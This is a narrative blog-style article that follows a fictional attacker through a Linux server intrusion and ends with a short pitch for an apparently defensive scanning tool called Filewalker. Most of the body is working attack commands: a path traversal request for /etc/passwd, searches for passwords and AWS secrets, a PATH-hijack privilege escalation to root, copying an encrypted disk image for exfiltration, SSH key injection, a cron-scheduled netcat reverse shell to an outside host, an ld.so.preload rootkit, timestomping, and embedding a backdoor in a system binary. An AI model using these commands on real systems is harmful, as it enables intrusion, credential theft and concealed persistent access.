# Walking the File System Like a Hacker

## A Modern Hacking Ops Mission

### Mission Briefing

In cybersecurity, file system traversal is the equivalent of tactical movement in hostile terrain — searching, probing, and exploiting while evading detection. Modern adversaries have elevated file system traversal into an art form, leveraging Living-Off-The-Land Binaries (LOLBins), stealthy privilege escalation exploits, and rootkits that make them ghosts within the system. Speed and efficiency are paramount. Slow operations get attackers caught. Slow responses get defenders breached.

Knowledge of the file system is power. In the right hands, a single file can be a kill switch, a backdoor, or a direct path to root control.

This mission log is a behind-the-scenes look at a fictional — but highly realistic — hacking operation. Red Fox, a well-funded adversary group, is targeting a corporate research server. Their point man, Ghost, moves with precision and intent, using modern techniques that mirror real-world breaches.

## Phase One: Initial Breach

**Target**: A high-value Linux server hosting confidential research.

**Entry Point**: Web application vulnerability.

**Objective**: Establish a foothold, remain undetected, and conduct rapid reconnaissance.

Ghost identifies a directory traversal vulnerability in the target's web application — a gaping side door into the fortress. With a crafted URL, he tricks the web server into exposing the /etc/passwd file:

```bash
GET /downloads/../../../../etc/passwd HTTP/1.1
Host: target.corp
```

The response confirms the vulnerability. System user accounts spill onto his screen. Mission go.

He quickly doubles down — using the same exploit to pull application configuration files. Success. Database credentials are exposed. Using these, he pivots — SSHing into the server as webadmin.

The initial foothold is secure.

## Phase Two: Reconnaissance

An attacker's first 15 minutes on a compromised system are make-or-break.

They need to:

- Determine the environment → Workstation, server, or container?
- Identify the OS → Different OSes require different techniques.
- Map the filesystem layout → Where are the valuable files?

Ghost moves like a special operations unit in urban combat — methodically clearing each directory, prioritizing high-value targets.

### Intel Gathering

```bash
# Establishing orientation
uname -a
whoami && pwd
ls -la /home
ls -la /var/www
cat /etc/os-release
find /etc -name "*.conf" -type f -mtime -7
```

### System Wide Scans

```bash
# Searching for sensitive files
find / -type f -name "*pass*" 2>/dev/null
grep -R "AWS_SECRET" /home 2>/dev/null
find /opt -name "*.sql" -o -name "*.db" 2>/dev/null
```

**Hit.**

An `/opt/backups/db_backup.sql` file, containing database connection strings.

Another foothold.

### The Filesystem Tells Stories

Ghost knows that filesystems are narrative archives — they tell stories about user behavior, system operations, and security posture:

```bash
# Finding recently modified files—signs of activity
find / -type f -mtime -1 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Identifying large files—potential data stores
find / -type f -size +100M 2>/dev/null

# Locating world-writable directories—potential staging areas
find / -type d -perm -o+w 2>/dev/null
```

Each command reveals another chapter in the system's story. Ghost reads between the lines, building a mental map of the target environment.

## Phase Three: Privilege Escalation

Intel suggests a weakness. Ghost hunts for privilege escalation paths.

```bash
# Scanning for SUID binaries (potential root escalations)
find / -perm -4000 -type f 2>/dev/null
```

**Hit.**

`/usr/local/bin/backup.sh` — a script running with SUID privileges (executed as root).

**Problem**: The script calls tar without specifying a full path.

**Solution**: Ghost hijacks tar, tricking the system into running his script as root.

```bash
echo "/bin/sh" > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup.sh
```

**Result**: A root shell.

He's inside the command center.

Once privileges are escalated, attackers begin searching for sensitive data:

```bash
# Hunting for high-value targets
find / -type f -size +1G -mtime -180 2>/dev/null
```

**Hit.**

A directory named `/research/archive` catches his eye—inside, a 12GB encrypted disk image (confidential.img).

Ghost doesn't need to crack the encryption now — that would take time and CPU cycles. Instead, he duplicates the raw disk image for offline decryption.

```bash
# Quietly copying the encrypted disk image
dd if=/research/archive/confidential.img of=/dev/shm/exfil.img bs=4M status=none
```

No logs. No traces. Writing to `/dev/shm` keeps the stolen data in memory, avoiding disk writes that might trigger alerts.

### The Kernel's Blind Spots

Ghost knows that Linux has inherent blind spots — areas where the kernel implicitly trusts user input:

```bash
# Checking for vulnerable kernel modules
lsmod | grep -i "vulnerable_module"

# Looking for writable service configuration files
find /etc/systemd -type f -writable 2>/dev/null

# Identifying misconfigured capabilities
getcap -r / 2>/dev/null
```

These commands expose the system's trust architecture — revealing where Ghost can manipulate the kernel's decision-making process.

## Phase Four: Persistence

Now Ghost locks down his access.

### 1️⃣ Planting a Silent Backdoor

```bash
# Injecting SSH keys for persistent access
echo "ssh-rsa AAAAB3Nz...[attacker_key]..." >> /root/.ssh/authorized_keys
```

**Result**: Even if credentials change, Ghost retains root access.

### 2️⃣ Covert Task Execution (Cron Job Persistence)

```bash
# Setting a reverse shell trigger every minute
(crontab -l; echo "* * * * * nc 10.0.0.123 4444 -e /bin/sh") | crontab -
```

**Result**: A quiet fail-safe. Even if Ghost loses his shell, the system will call him back — again and again.

### 3️⃣ Deploying a Rootkit for Stealth

```bash
# Modifying /etc/ld.so.preload to hijack system calls
echo "/lib/libghost.so" > /etc/ld.so.preload
```

**Result**: Processes, logs, and file changes disappear.

Rootkits like this are virtually undetectable without advanced monitoring.

> **Modern TTPs Note** → While rootkits remain viable, sophisticated adversaries often favor malware-free persistence methods like cloud service abuse, credential stuffing, or modifying legitimate system daemons. The techniques shown here represent just one approach in an evolving threat landscape.

### The Art of Hiding in Plain Sight

Ghost employs advanced techniques to blend into the system's normal operations:

```bash
# Timestomping—matching file timestamps to hide modifications
touch -r /bin/bash /lib/libghost.so

# Creating hidden directories that most tools ignore
mkdir " \t\n"

# Embedding backdoor in legitimate binaries
objcopy --add-section .backdoor=/tmp/payload --set-section-flags .backdoor=noload,readonly /bin/ls /bin/ls.modified
```

These techniques exploit how administrators and security tools interact with the filesystem — hiding malicious activity in the cognitive blind spots of defenders.

> **Real-World Parallel** → APT38, a state-sponsored North Korean threat actor, has used similar file system reconnaissance and privilege escalation techniques to infiltrate financial institutions, mirroring Ghost's tactics here. Their ability to rapidly enumerate systems and move laterally is what makes them so dangerous. But defenders who move faster — leveraging automated file traversal — can cut off attackers before they establish persistence.

## The Filesystem Arms Race

Ghost's success was a mix of precision, speed, and stealth. But defenders can turn the tables with the right tools.

The battlefield is asymmetric:

| **Aspect**                  | **Attackers**                          | **Defenders**                              |
|-----------------------------|----------------------------------------|--------------------------------------------|
| **Weakness**                | Need only one weakness                 | Must cover everything                      |
| **Precision**               | Operate with surgical precision        | Must maintain vigilance across systems     |
| **Timing**                  | Choose when to strike                  | Must be alert 24/7                         |
| **Failure**                 | Can abandon failed attempts            | Can never abandon their posts              |

But defenders have one critical advantage: scale.

While Ghost manually traverses one system at a time, defenders can deploy Filewalker across an entire enterprise simultaneously.

### The Solution

- ✅ Scale your reconnaissance.
- ✅ Automate your threat hunting.
- ✅ Stay faster than the attacker.
